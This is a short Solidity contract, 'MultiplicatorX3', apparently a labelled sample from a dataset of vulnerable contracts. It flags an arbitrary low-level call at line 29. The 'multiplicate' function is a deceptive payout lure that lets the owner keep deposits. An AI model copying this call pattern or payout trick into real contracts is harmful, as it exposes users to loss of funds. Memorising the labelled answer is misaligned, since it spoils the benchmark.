/*
 * @source: etherscan.io 
 * @author: -
 * @vulnerable_at_lines: 29
 */

pragma solidity ^0.4.18;

contract MultiplicatorX3
{
    address public Owner = msg.sender;
   
    function() public payable{}
   
    function withdraw()
    payable
    public
    {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }
    
    function Command(address adr, bytes data) payable public {
        require(msg.sender == Owner);
        bool success;
        bytes memory result;
        (success, result) = adr.call.value(msg.value)(data);
        require(success, 'External call failed');
    }
    
    function multiplicate(address adr)
    public
    payable
    {
        if(msg.value>=this.balance)
        {        
            adr.transfer(this.balance+msg.value);
        }
    }
}